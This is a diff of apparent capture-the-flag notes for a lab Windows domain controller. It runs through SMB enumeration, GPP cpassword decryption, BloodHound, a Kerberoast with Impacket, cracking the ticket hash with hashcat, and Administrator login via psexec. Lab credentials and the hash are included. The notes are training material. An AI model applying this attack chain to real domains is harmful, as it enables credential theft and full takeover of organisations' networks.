@@ -1,5 +1,4 @@
 [SMB (445/tcp)]
-
 --------------------------- NMAP ---------------------------
 locate -r '\.nse$' | grep smb | xargs grep categories | grep 'safe\|default'
 nmap --script smb-enum-services 10.10.10.100
@@ -15,10 +14,12 @@ nmap --script safe 10.10.10.100
 |
 |___SMB2 ONLY (NO SMB1 Support)
 
+
 --------------------------- Metasploit ---------------------------
 use auxiliary/scanner/smb/smb2
 |
 |___Supports SMB 2 [dialect 255.2] and has been online for 22 hours
+
 
 --------------------------- SMBMAP ---------------------------
 smbmap -H 10.10.10.100
@@ -35,6 +36,7 @@ smbmap -H 10.10.10.100
 smbmap -R Replication -H 10.10.10.100
 smbmap -R Replication -H 10.10.10.100 -A Groups.xml -q
 
+
 --------------------------- SMBCLIENT ---------------------------
 smbclient -L \\\\10.10.10.100\\
 |
@@ -48,8 +50,6 @@ smb: \> get Groups.xml
 |_cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
 
 
-
-
 --------------------------- GPP Decryption ---------------------------
 gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
 |
@@ -60,21 +60,33 @@ smbclient \\\\10.10.10.100\\Users -U 'SVC_TGS'
 Password: GPPstillStandingStrong2k18
 
 
+[LDAP (389/tcp)]
+--------------------------- Running BloodHound ---------------------------
+1. Windows to Get BloodHound.zip
+2. Linux Neo4j 
+3. Process BloodHound.zip from Windows
+4. Find out that the Administrator is Kerberoastable
+
 
 [KERBEROS (88/tcp)]
 --------------------------- Kerberos with Kerberoast Attack ---------------------------
 1. Get SPN with Impacket
 sudo nano /etc/resolv.conf -> Add nameserver 10.10.10.100
-python3 GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18
-python3 GetUserSPNs.py -dc-ip 10.10.10.100 -request active.htb/SVC_TGS:GPPstillStandingStrong2k18
+GetUserSPNs.py -dc-ip 10.10.10.100 -request active.htb/SVC_TGS:GPPstillStandingStrong2k18
 |
-|___[ERROR]: KRB_AP_ERR_SKEW(Clock skew too great)
-    |
-    |___[SOLUTION]: Synchronizing Clock or Enumerating LDAP with Windows....
+|_ Hash: $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$c52a4941d2a09b74565be37a8c95dab6$8ccde0ce5d8cae788d6d3d48fb14e46a827dfcbb2460cafb3abf76d411514d2b11d758d93f37e047294c848789b285462d7f7028f44594553c3bf9b250f9e87417ad09f7cfab92c872a025bd658801dee459e913df5b72a0ad8552035a29580b97b4d9172267028f656367e385e0a68367696ac53ecb824a676adf3ef128718a8156f3f49697e9f878cd767402b0ffb82d1b88b3e6647046c7bd46e60b305c14792c015aade695f89c3fba4388f7235d04617b154d3c93ea54102332dc27b7b15238b03c1549c4fae29f101d42a3c65cef074676efe93e82790af7cd9bc0db2d7ab32bee04bb9197f67e88c433ca904b42daa1312860ed341ba0c1c9edf87addf2f0bb0304f9e770af5c99e73a9349f4b654bd383e11fe19994f3c3c3212e5674ccf24fc25ed7bef8c6e071a873b78bd85c056811f87758bf050ef157ef63e9dd7cf07b1de6ee7f9b3e19b71882c539c2e885a38d47c36537517aeebc9b4f4c5fdec6451a3c8f4c867311a071d6d46969fbb0717cf0017b935d19de63fb815448009f058c8ac415ccb1d2c01428b26366122039bc6476646e9c13415522d5a06c873ef1aa4444f2f96ed8461f5187ecb664b78ec24683cb08fa1c00daeb4d2f108c15c24d8cd4b81bb086548b87ae3dfae97db17dcf98878cccfff0e875fc00a0ba4fa61185853105f5ad90669cb88fbb170b6d67052598e31dbd5e4421ef9e2e955bf1ffc0596fdbf7e80c7d7e3acd65fd12240d039c01f7f0038322368a723faeb439c7eb2c3bfb746b97f1be7e3981ff62820cbaafc4758348bdaffcdb510bbf9012aaa215e9ec949dfbf827f6492fa94938dde9b93cd96a5c1fbe6251da43cbdf925e9ffd4a864e720ff92608160444b75ac3eaea4ded5f762728086d1d0dba01e515957a9ed51a28cbf9d15036e938d91b79f4f7402bc5f40b6a3d306b645402cbde443eaa8f9c2b5b27387cd9378ef01723c51302967075357e5398f131efe98c335ac26db39bb5425bdaa58fe28ab91fac0bb213ca7eb17db4cfb9345995a08215d7a6b035895866c2678f2c73dfb5be10745f1ec0c6bfe71630fd017863310df03aa63c50655557ddc29d472790f474e8233588474aef313ac57c59b248ac6f8483454eb236433e69da6ebe4395c62274e1cba4f58915abbbc2d76a696310b0f683dc14fcbb2192ccc1499b92628c653222ebcc7ed7a15f5fc48c09644ed64930ca0023da3710ce2b51f69b9dd88f298ed4f7ba040a2
 
 
+--------------------------- Cracking Hash with Hashcat ---------------------------
+hashcat -m 13100 HASH /usr/share/wordlists/rockyou.txt --force
+|
+|___Password: Ticketmaster1968
 
+--------------------------- Administrator Login ---------------------------
+smbclient \\\\10.10.10.100\\Users -U "Administrator"
+Password: Ticketmaster1968
 
+OR
 
-
+psexec.py active.htb/Administrator@10.10.10.100
 
